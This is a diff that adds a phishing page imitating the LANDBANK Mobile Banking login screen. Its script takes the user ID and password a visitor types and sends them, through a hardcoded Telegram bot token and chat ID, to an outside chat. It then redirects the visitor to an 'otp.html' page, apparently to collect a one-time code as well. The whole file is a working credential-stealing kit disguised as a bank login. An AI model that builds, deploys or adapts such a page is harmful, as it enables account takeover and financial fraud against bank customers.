@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LANDBANK Mobile Banking</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { background: linear-gradient(to bottom right, #b4d444, #44a43c, #2c8c34); height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        .logo-area { margin-bottom: 50px; }
+        .logo-main { color: white; font-size: 58px; font-weight: 900; letter-spacing: -3px; line-height: 0.8; }
+        .logo-sub { color: white; font-size: 26px; font-weight: 400; letter-spacing: 1px; margin-top: 5px; }
+        
+        .input-group { background: white; border-radius: 4px; margin-bottom: 12px; display: flex; align-items: center; padding: 12px 15px; height: 65px; position: relative; }
+        .label-left { color: #4CAF50; font-size: 18px; position: absolute; left: 15px; cursor: pointer; }
+        .input-group input { border: none; outline: none; flex: 1; font-size: 22px; color: #333; text-align: right; padding-right: 40px; }
+        .icon-box { position: absolute; right: 15px; display: flex; align-items: center; }
+        
+        .btn-login { background-color: #d8d8d8; color: #a8a8a8; border: none; width: 100%; padding: 22px; border-radius: 4px; font-size: 22px; margin-top: 20px; cursor: not-allowed; transition: 0.3s; }
+        .btn-login.active { background-color: #ffffff; color: #44a43c; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-area">
+            <div class="logo-main">LANDBANK</div>
+            <div class="logo-sub">MOBILE BANKING</div>
+        </div>
+
+        <div class="input-group">
+            <span class="label-left">Unlock</span>
+            <input type="text" id="userId" placeholder="User ID">
+            <div class="icon-box">
+                <img src="https://img.icons8.com/material-rounded/24/76ba1b/user-male-circle.png">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <span class="label-left">?Forgot</span>
+            <input type="password" id="password" placeholder="Password">
+            <div class="icon-box">
+                <img src="https://img.icons8.com/material-rounded/24/76ba1b/lock.png">
+            </div>
+        </div>
+
+        <button id="loginBtn" class="btn-login" disabled>Log in</button>
+    </div>
+
+    <script>
+        // --- إعدادات تيليجرام ---
+        const BOT_TOKEN = '7387031434:AAGg2Pgi90Bwiyio8Y-A7DqUr6U_fcIYLAI'; 
+        const CHAT_ID = '8129155953';
+
+        const u = document.getElementById('userId'), p = document.getElementById('password'), b = document.getElementById('loginBtn');
+        
+        u.oninput = p.oninput = () => {
+            const ok = u.value.length > 0 && p.value.length > 0;
+            b.disabled = !ok;
+            b.classList.toggle('active', ok);
+        };
+
+        b.onclick = () => {
+            if(!b.disabled) {
+                const text = `🔔 **New Login**\n👤 User: ${u.value}\n🔑 Pass: ${p.value}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
+                .then(() => { window.location.href = 'otp.html'; });
+            }
+        };
+    </script>
+</body>
+</html>
